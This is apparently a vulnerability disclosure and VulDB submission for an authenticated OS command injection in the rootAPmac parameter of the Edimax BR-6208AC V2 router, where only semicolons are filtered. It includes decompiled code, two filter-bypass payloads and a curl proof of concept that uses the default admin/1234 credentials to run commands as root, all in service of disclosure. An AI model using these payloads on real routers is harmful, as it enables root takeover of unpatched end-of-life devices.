# [CVE-TBD] Edimax BR-6208AC V2 1.03 OS Command Injection (CWE-78)

## VulDB Submission Fields

- Vendor: Edimax
- Product: BR-6208AC V2
- Version or Commit: 1.03
- Vulnerability: OS Command Injection (CWE-78)
- Advisory / Exploit URL: replace this with the URL of this directory after copying it to your public repository
- Description:

```
A command injection vulnerability was discovered in Edimax BR-6208AC V2 firmware v1.03 (the latest and final firmware; the product is end-of-life). When the parameter doConnectTest=1 is present, the formWlbasic handler (/goform/formWlbasic) embeds the value of rootAPmac into the shell command echo '<value>' > /tmp/apcli0_rootMAC and executes it via system(). The input filter rejects only the semicolon character (0x3b); single quotes, newlines and command substitution are not filtered, so the incomplete blacklist is trivially bypassed. Two independent escapes were dynamically verified as uid=0 in a rehosted firmware environment: closing the quote with x'$(cmd)'y and separating commands with embedded newlines; a control payload without quote closing executed nothing. Reproduction: curl -u admin:1234 --data-urlencode doConnectTest=1 --data-urlencode "rootAPmac=x'\$(ping -c 3 <attacker-ip>)'y" http://192.168.2.1/goform/formWlbasic results in ICMP echo requests from the router at the attacker host. Authentication requires the web admin credentials; factory defaults admin/1234 apply to un-hardened devices and are disclosed in the 401 realm. The same handler, parameter and root-cause class on the sibling model BR-6478AC (firmware 1.23) is covered by CVE-2026-10166; the semicolon-only filter mechanism and the two escape techniques are documented here for the first time, and per-product assignment is this CNA's established practice (CVE-2025-15256 previously covered the distinct formStaDrvSetup endpoint on this model). Proposed CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H (7.2).
```

---

## Technical Disclosure

# CVE-TBD: OS Command Injection in Edimax BR-6208AC V2 formWlbasic Handler (`rootAPmac`, Semicolon-Only Filter Bypass)

## Summary

The `formWlbasic` handler of the Edimax BR-6208AC V2 web management interface (firmware 1.03)
embeds the POST parameter `rootAPmac` into a shell command line and executes it with `system()`.
The input filter rejects **only the semicolon character** — single quotes, newlines and command
substitution are all accepted, so the filter is trivially bypassed. An authenticated attacker
executes arbitrary commands as **root**. The vulnerable path is gated by the parameter
`doConnectTest=1`.

## Affected Product

- Vendor: Edimax
- Product: BR-6208AC V2 (hardware version 2.0)
- Firmware: 1.03 — latest and final version (product is End-of-Life)

## Vulnerability Details

- Type: CWE-78 (OS Command Injection), caused by an incomplete blacklist filter
- Root cause (sink @ 0x493cc0 sprintf → 0x493cd8 system):

```c
if (strcmp(websGetVar(wp, "doConnectTest", ""), "1") == 0) { // gate @ 0x493c34
 mac = websGetVar(wp, "rootAPmac", "");
 if (*mac) {
 for (i = 0; i < strlen(mac); i++)
 if (mac[i] == ';') goto reject; // ONLY ';' (0x3b) is rejected
 sprintf(buf, "echo '%s' > /tmp/apcli0_rootMAC", mac); // value wrapped in single quotes
 system(buf); // root
 }
}
```

The value is single-quoted, but `'` itself, `\n`, backticks and `$()` are not filtered. Two
independent escapes were verified:

1. **Quote closing + command substitution**: `x'$(ping -c 3 192.168.2.10)'y`
 → `echo 'x'$(ping -c 3 192.168.2.10)'y' > /tmp/apcli0_rootMAC`
2. **Newline command separation**: `x'\nping -c 3 192.168.2.10\n'y` (the shell treats the
 newline as a command separator)

A control payload without quote closing (`x$(cmd)y`) executed nothing, confirming the filter
logic was understood exactly.

## Proof of Concept (non-destructive)

```bash
curl -s -o /dev/null -w "%{http_code}\n" -u admin:1234 \
 --data-urlencode "doConnectTest=1" \
 --data-urlencode "rootAPmac=x'\$(ping -c 3 192.168.2.10)'y" \
 http://192.168.2.1/goform/formWlbasic
# Observe three ICMP echo requests from the router at 192.168.2.10.
```

Verified in a rehosted firmware environment (marker files created as uid=0 for both escape
styles; web server stayed alive afterwards).

## Impact

- Attacker: authenticated web-admin user (factory default credentials `admin/1234` apply to
 un-hardened devices and are disclosed in the 401 realm — see `../01-webs-401-preauth-dos`).
- Effect: arbitrary command execution as root on the 2.4 GHz basic-settings / wizard code path.

## Related Work

- **CVE-2026-10166** covers the same handler/parameter/root-cause class on the sibling model
 BR-6478AC (firmware 1.23). This report is for the independently built BR-6208AC V2 firmware
 (per-product assignment is this CNA's established practice).
- **CVE-2025-15256** covers `rootAPmac` injection in the *distinct* `formStaDrvSetup` endpoint
 on this same model. The semicolon-only filter and the two escape techniques documented here
 are published for the first time (neither public record describes the filter internals).

## CVSS 3.1

`CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` = **7.2 (High)**

## Discovery

 Vendor notified: see
top-level README.

## Proof of Concept

See the poc file(s) in this directory.
